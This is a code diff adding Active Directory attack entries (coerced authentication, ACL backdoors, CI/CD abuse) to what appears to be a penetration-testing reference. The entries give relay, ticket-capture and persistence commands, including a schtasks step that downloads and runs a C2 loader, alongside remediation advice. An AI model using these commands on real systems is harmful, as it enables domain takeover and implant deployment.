@@ -2716,6 +2716,166 @@ var VULNS = [
             ]
           }
         ]
+      },
+      {
+        id: "authentication-coercion",
+        name: "Authentication Coercion (Forced Authentication)",
+        severity: "High",
+        ref: "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications",
+        description: "Built-in Windows RPC interfaces can be abused to force a target machine — often a domain controller — to authenticate to an attacker-controlled host, yielding its machine-account authentication for relay or capture.",
+        brief: "Several Windows RPC interfaces expose methods that take a server or UNC path and then connect to it authenticated as the calling machine's computer account. That is legitimate functionality — a print server checking a remote spooler, EFS talking to a file server — but it means an attacker who can reach the interface can name their own host as the destination and coerce the target into authenticating to them. No credentials are needed to trigger it, only network access to the RPC endpoint.\n\nThe coerced authentication is then used two ways. It can be relayed (NTLM relay) onward to a service that doesn't enforce signing/channel binding — LDAP, AD CS web enrollment (ESC8), or SMB — to act as the victim machine. Or, if the attacker controls a host trusted for unconstrained delegation, the victim's TGT is captured from the authentication and reused. Coercing a domain controller this way is a common path from a low-privileged foothold to domain compromise. The named primitives (Printer Bug, PetitPotam and others) are all instances of the same coercion class.",
+        quickReference: [
+          { label: "MS-RPRN (Printer Bug)", cmd: "SpoolSample.exe <target-DC> <attacker-host>" },
+          { label: "MS-EFSR (PetitPotam)", cmd: "Coerce via EfsRpcOpenFileRaw to \\\\attacker-host\\share" },
+          { label: "Capture (unconstrained deleg.)", cmd: "Rubeus monitor /interval:5 -> victim TGT" },
+          { label: "Relay onward", cmd: "ntlmrelayx -t ldap(s)://dc  or  http://ca/certsrv (ESC8)" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Coerce the target to authenticate (Printer Bug, MS-RPRN)", cmd: "# force <target> to authenticate to <listener> as <target>$ (machine account)\nSpoolSample.exe dcorp-dc dcorp-appsrv\n# via Sliver: execute-assembly the SpoolSample .NET binary in memory" },
+              { label: "1-alt. Coerce via other RPC surfaces", cmd: "# MS-EFSR (PetitPotam), MS-FSRVP, MS-DFSNM all expose coercion methods:\nPetitPotam.exe <listener> <target>\n# tooling such as Coercer sweeps multiple methods automatically" },
+              { label: "2a. Capture path — host trusted for unconstrained delegation", cmd: "# on a host with unconstrained delegation, monitor for the incoming TGT:\nRubeus.exe monitor /interval:5 /nowrap\n# coerce the DC -> its TGT lands in the listener's memory -> ptt and DCSync" },
+              { label: "2b. Relay path — forward the auth to a vulnerable service", cmd: "# relay the coerced machine auth to LDAP (RBCD) or AD CS web enrollment (ESC8):\nntlmrelayx.py -t ldaps://dcorp-dc --delegate-access      # write RBCD on the DC object\nntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs    # ESC8 -> machine cert -> TGT" },
+              { label: "3. Use the resulting privilege", cmd: "# captured/relayed as the DC machine account or a DA -> DCSync, RBCD S4U, or a cert-based TGT\nRubeus.exe asktgt /user:dcorp-dc$ /certificate:<pfx> /ptt   # (ESC8 result)" }
+            ]
+          },
+          {
+            title: "Why It Works",
+            type: "notes",
+            items: [
+              "The coercion methods are legitimate RPC functionality: each takes a caller-supplied server/UNC path and connects to it, and Windows authenticates that outbound connection automatically as the machine account. Naming an attacker host as the destination is a valid call, so the primitive cannot simply be patched away without breaking the feature.",
+              "Machine accounts authenticate with a password the OS manages, so no attacker credentials are required to obtain a high-value authentication — only the ability to invoke the RPC method.",
+              "The coerced authentication is only useful because a second weakness accepts it: a downstream service without SMB/LDAP signing or channel binding (relay), or a host configured for unconstrained delegation that stores the resulting TGT (capture). Coercion is the trigger; the accepting service is the vulnerability it chains into.",
+              "Domain controllers are the highest-value target because their machine account has directory-replication (DCSync) rights, so coercing a DC and relaying/capturing its authentication frequently equals domain compromise."
+            ]
+          },
+          {
+            title: "Coercion Primitives",
+            type: "table",
+            columns: ["Interface / name", "Trigger"],
+            rows: [
+              ["MS-RPRN (Printer Bug)", "RpcRemoteFindFirstPrinterChangeNotification — the classic spooler coercion (SpoolSample / Dementor)"],
+              ["MS-EFSR (PetitPotam)", "EfsRpcOpenFileRaw and related EFS methods — often works unauthenticated"],
+              ["MS-FSRVP", "Shadow-copy RPC coercion (ShadowCoerce)"],
+              ["MS-DFSNM", "DFS namespace management coercion (DFSCoerce)"],
+              ["Automation", "Coercer / PetitPotam sweep multiple methods to find one that is reachable"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["SpoolSample / Dementor", "Trigger the MS-RPRN Printer Bug coercion"],
+              ["PetitPotam / Coercer", "Trigger MS-EFSR and sweep multiple coercion methods"],
+              ["Rubeus (monitor)", "Capture a coerced TGT on an unconstrained-delegation host"],
+              ["ntlmrelayx (Impacket)", "Relay the coerced NTLM auth to LDAP / AD CS / SMB"],
+              ["Sliver (execute-assembly)", "Run SpoolSample / Rubeus in memory from a foothold"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "The Hacker Recipes — Coerced authentications", url: "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications" },
+              { label: "MITRE ATT&CK — Forced Authentication (T1187)", url: "https://attack.mitre.org/techniques/T1187/" },
+              { label: "Microsoft — KB5005413 (mitigating NTLM relay to AD CS)", url: "https://support.microsoft.com/en-us/topic/kb5005413" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Enforce SMB signing and LDAP signing + channel binding everywhere so coerced NTLM cannot be relayed onward.",
+              "Enable Extended Protection for Authentication (EPA) on AD CS web enrollment and other HTTP services to break the ESC8 relay chain.",
+              "Remove unconstrained delegation; where delegation is required, use constrained or resource-based constrained delegation and protect sensitive accounts (add DAs to Protected Users / mark 'account is sensitive and cannot be delegated').",
+              "Restrict and monitor the coercion RPC surfaces (disable the Print Spooler where it is not needed, filter RPC at the network edge, watch for anomalous machine-account authentications to non-infrastructure hosts).",
+              "Apply the vendor mitigations for the named primitives, but treat the class — not any single CVE — as the thing to defend against."
+            ]
+          }
+        ]
+      },
+      {
+        id: "security-descriptor-backdoor",
+        name: "Security Descriptor / ACL Backdoors",
+        severity: "High",
+        ref: "https://cube0x0.github.io/Pocing-Beyond-DA/",
+        description: "An attacker with administrative access rewrites the security descriptors on remote-access subsystems (WMI, WinRM, services, registry, DCOM) to grant a low-privileged principal stealthy, file-less remote code execution rights.",
+        brief: "Most Windows remote-management surfaces — the WMI namespaces, WinRM/PSRemoting, the Service Control Manager, the remote registry, and DCOM — guard access with their own security descriptor (a DACL) that is evaluated when a caller connects. An attacker who already has admin on a host (or on a DC) can edit those descriptors to add an ACE granting a chosen low-privileged user the rights needed to execute code remotely. Afterwards that ordinary user can come back over WMI or PSRemoting and run commands as though they were an administrator.\n\nWhat makes this a durable backdoor is what it is not: no new account is created, no binary or service is dropped, no membership is added to a privileged group. It is a permissions change on components that are supposed to be there, so account-, file- and group-based detection all miss it. The RACE toolkit automates the common variants (remote WMI and PSRemoting descriptors); the same idea applies to service, registry and DCOM ACLs.",
+        quickReference: [
+          { label: "Backdoor remote WMI", cmd: "Set-RemoteWMI -SamAccountName studentX -ComputerName <host> -namespace 'root\\cimv2'" },
+          { label: "Backdoor PSRemoting", cmd: "Set-RemotePSRemoting -SamAccountName studentX -ComputerName <host>" },
+          { label: "Use it later (low-priv)", cmd: "Invoke-WmiMethod / Enter-PSSession as studentX -> admin actions" },
+          { label: "Revert", cmd: "…-Remove to strip the added ACE" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. From admin, grant a low-priv user remote WMI rights", cmd: "# edits the __SystemSecurity descriptor on the WMI namespace to add studentX\nSet-RemoteWMI -SamAccountName studentX -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\\cimv2' -Verbose\n# via Sliver: compile RACE.ps1 to .NET with PS2EXE, run with execute-assembly" },
+              { label: "2. Grant remote PSRemoting (WinRM RootSDDL) rights", cmd: "Set-RemotePSRemoting -SamAccountName studentX -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose\n# modifies the WinRM endpoint's security descriptor to allow studentX" },
+              { label: "3. Later, return as the low-priv user and execute code", cmd: "# no admin required now — the ACL grants it:\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName dcorp-dc\nEnter-PSSession -ComputerName dcorp-dc            # as studentX" },
+              { label: "4. Clean up / rotate the backdoor", cmd: "Set-RemoteWMI -SamAccountName studentX -ComputerName dcorp-dc ... -Remove -Verbose\nSet-RemotePSRemoting -SamAccountName studentX -ComputerName dcorp-dc -Remove -Verbose" }
+            ]
+          },
+          {
+            title: "Why It Works",
+            type: "notes",
+            items: [
+              "Each remote subsystem carries its own security descriptor that the OS checks at connection time. Windows deliberately lets an administrator edit those descriptors, so adding an ACE for a chosen user is a supported operation — the low-priv user then passes the access check exactly like a legitimate admin would.",
+              "The backdoor is stealthy because it changes permissions on existing, expected components rather than adding an artifact. There is no new user in the domain, no new local admin, no service binary and no scheduled task — the tripwires most monitoring watches for never fire.",
+              "It survives credential resets: the grantee is an ordinary account whose password can rotate normally; the standing access comes from the ACE, not from a stolen secret.",
+              "The same principle generalises across the SCM (service DACLs), the remote registry, and DCOM launch/access permissions — anywhere Windows exposes a descriptor an admin may edit, that descriptor can be turned into a persistence mechanism."
+            ]
+          },
+          {
+            title: "Backdoorable Surfaces",
+            type: "table",
+            columns: ["Surface", "What the ACL edit grants"],
+            rows: [
+              ["WMI namespace (root/cimv2)", "Remote WMI method execution (Win32_Process Create) as the granted user"],
+              ["WinRM / PSRemoting (RootSDDL)", "Enter-PSSession / Invoke-Command against the host"],
+              ["Service Control Manager", "Reconfigure/start a service -> code execution as its (often SYSTEM) account"],
+              ["Remote registry", "Read/write sensitive keys (Run keys, service configs, stored secrets)"],
+              ["DCOM launch/access", "Instantiate privileged COM objects remotely"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["RACE toolkit", "Set-RemoteWMI / Set-RemotePSRemoting — automate WMI and PSRemoting descriptor backdoors"],
+              ["PS2EXE", "Compile RACE.ps1 to a .NET assembly so Sliver's execute-assembly can run it in memory"],
+              ["sharp-wmi / Invoke-WmiMethod", "Return over the backdoored WMI namespace to execute code"],
+              ["Sliver (execute-assembly)", "Deploy and trigger the descriptor edits from a foothold"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "RACE toolkit (Nikhil Mittal / SamratAshok)", url: "https://github.com/samratashok/RACE" },
+              { label: "Pwning beyond Domain Admin — persistence via security descriptors", url: "https://cube0x0.github.io/Pocing-Beyond-DA/" },
+              { label: "MITRE ATT&CK — Account Manipulation (T1098)", url: "https://attack.mitre.org/techniques/T1098/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Baseline and monitor the security descriptors on WMI namespaces, the WinRM RootSDDL, service DACLs and DCOM permissions; alert on ACE additions for non-administrative principals.",
+              "Limit local administrator access (it is the prerequisite for setting these backdoors) with LAPS and tiered administration.",
+              "Restrict who can reach WMI/WinRM remotely at the network layer, so a granted ACE still cannot be used from an arbitrary host.",
+              "After any host or DC compromise, audit these descriptors as part of eviction — a password reset alone does not remove an ACL backdoor.",
+              "Enable object-access auditing on the relevant subsystems so descriptor changes are logged centrally."
+            ]
+          }
+        ]
       }
     ]
   },
@@ -4922,6 +5082,88 @@ var VULNS = [
               "Require SMB signing and LDAP channel binding so any captured auth cannot be relayed.",
               "Ensure DNS is correct and complete so hosts rarely need to fall back to broadcast resolution.",
               "Monitor for LLMNR/NBT-NS responders and enforce strong passwords + MFA to blunt cracked hashes."
+            ]
+          }
+        ]
+      },
+      {
+        id: "cicd-abuse",
+        name: "CI/CD Pipeline & Automation-Server Abuse",
+        severity: "High",
+        ref: "https://owasp.org/www-project-top-10-ci-cd-security-risks/",
+        description: "Build and automation servers expose functionality — arbitrary build steps, script consoles, stored credentials, and build agents — that turns any user who can define or trigger a job into code execution, often as a privileged service account.",
+        brief: "A CI/CD or automation server (Jenkins, TeamCity, GitLab/GitHub runners, Azure DevOps, Bamboo) exists to run code on demand. That is its purpose, and it is also the problem: a build step that runs an arbitrary shell or batch command, a built-in script console, an editable pipeline definition, or a plugin that shells out all give a user who can create or modify a job direct code execution on the server or its agents. Because builds usually run as a privileged service account and the server holds a credential store (deploy keys, cloud tokens, signing keys, service-account passwords), that execution frequently unlocks the wider environment rather than just one host.\n\nThis is a class of feature abuse, not a single product vulnerability. Weak or absent authentication, over-generous 'anyone can build' permissions, and readable job configuration turn the automation server into a foothold and a pivot: run commands, read the credential store, and move to whatever the pipeline was trusted to deploy to. In the lab this is the Jenkins-to-server step, but the same shape appears across every build system.",
+        quickReference: [
+          { label: "Recon the server", cmd: "nmap <host> -p 8080 -sC -sV -Pn   # + browse the UI (People tab leaks users)" },
+          { label: "RCE via a build step", cmd: "Build step 'Execute shell/Windows batch command' -> your command" },
+          { label: "RCE via script console", cmd: "Jenkins Script Console (Groovy) / equivalent -> code execution" },
+          { label: "Loot", cmd: "Read the credential store, environment secrets, deploy keys" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Discover and fingerprint the automation server", cmd: "nmap 172.16.3.11 -p 8080 -sC -sV -Pn\n# browse the web UI; enumerate users (e.g. Jenkins 'People' tab), jobs and permissions\n# check for anonymous/weak auth and 'anyone can configure/build' settings" },
+              { label: "2a. Code execution via a build-step command", cmd: "# in a job you can create or edit, add a build step that runs an OS command.\n# example: stage and run a C2 loader via scheduled tasks from a Windows batch step:\nschtasks /create /tn \"stage\" /sc ONSTART /tr \"cmd /c curl http://<c2>/loader.exe -o C:\\Windows\\Temp\\loader.exe\"\nschtasks /create /tn \"run\"   /sc ONSTART /tr \"C:\\Windows\\Temp\\loader.exe <c2> 8080 payload.bin\"\nschtasks /run /tn \"stage\"  &  schtasks /run /tn \"run\"\n# the build runs as the CI service account -> a foothold on the build host/agent" },
+              { label: "2b. Code execution via a script console", cmd: "# many servers ship an admin scripting surface (Jenkins Groovy console, etc.)\n# reachable to over-privileged users -> direct in-process code execution:\n\"whoami\".execute().text        # Groovy example run from the console" },
+              { label: "3. Harvest the credential store and pipeline secrets", cmd: "# CI servers store deploy/cloud/signing credentials for the pipelines they run:\n# print injected build environment / bound credentials, or read the credentials store,\n# then reuse those secrets against the systems the pipeline was trusted to deploy to." },
+              { label: "4. Move to what the pipeline could reach", cmd: "# the build identity often has rights to deploy targets, artifact registries, and\n# cloud tenants. Pivot from the build host to those, or lateral-move with the harvested creds." }
+            ]
+          },
+          {
+            title: "Why It Works",
+            type: "notes",
+            items: [
+              "Running arbitrary code is the intended function of a build server — a build step that executes a shell command is a feature, so 'RCE' here needs no memory-corruption exploit, only permission to define or trigger a job.",
+              "Builds run as a shared, often privileged, service account rather than as the user who launched them, so a low-privileged contributor's job executes with the automation server's authority.",
+              "The server is a credential concentrator: to deploy, it must hold secrets for every environment it deploys to, so one code-execution primitive exposes a store that reaches far beyond the build host.",
+              "The common misconfigurations are permission defaults, not bugs: anonymous or weak authentication, 'anyone can build/configure', readable job config, and unrestricted plugins each widen who can reach the execution surface.",
+              "Build agents multiply the blast radius — code runs on whatever pool of agents the job targets, and agents are frequently domain-joined and reused across projects."
+            ]
+          },
+          {
+            title: "Abusable Functionality",
+            type: "table",
+            columns: ["Feature", "How it becomes execution"],
+            rows: [
+              ["Build steps (Execute shell / batch)", "Directly runs attacker-supplied OS commands as the build account"],
+              ["Script consoles (Groovy, etc.)", "In-process scripting surface = immediate code execution for privileged users"],
+              ["Pipeline-as-code (Jenkinsfile / YAML)", "A committed pipeline definition runs on the server/agents on trigger"],
+              ["Credential bindings / secret store", "Deploy keys, cloud tokens and service passwords exposed to the running job"],
+              ["Plugins / integrations", "Extensions that shell out or evaluate expressions add more execution paths"],
+              ["Build agents / runners", "Execution lands on domain-joined, reused agents — a lateral-movement launchpad"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["nmap / browser", "Locate and fingerprint the server; enumerate users, jobs and permissions"],
+              ["Native job/build steps", "The primary execution primitive — no exploit binary required"],
+              ["schtasks / curl / loaders", "Stage and launch a C2 implant from a build step"],
+              ["Sliver (pivot listener)", "Catch the foothold from the build host and pivot inward"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP Top 10 CI/CD Security Risks", url: "https://owasp.org/www-project-top-10-ci-cd-security-risks/" },
+              { label: "MITRE ATT&CK — CI/CD / Cloud Administration abuse", url: "https://attack.mitre.org/techniques/T1651/" },
+              { label: "The Hacker Recipes — CI/CD and build systems", url: "https://www.thehacker.recipes/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Require authentication and enforce least-privilege authorization — remove anonymous access and 'anyone can build/configure'; separate who can view, trigger and edit jobs.",
+              "Lock down or disable script consoles and restrict which users can define pipelines / edit build steps.",
+              "Scope and vault credentials per pipeline, prefer short-lived tokens, and never expose broad standing secrets to arbitrary jobs.",
+              "Run builds on isolated, least-privileged, ideally ephemeral agents that are not domain-joined admins, so a compromised build cannot pivot freely.",
+              "Log and alert on job configuration changes, new build steps, and script-console use; review pipeline definitions in code review like any other code."
             ]
           }
         ]
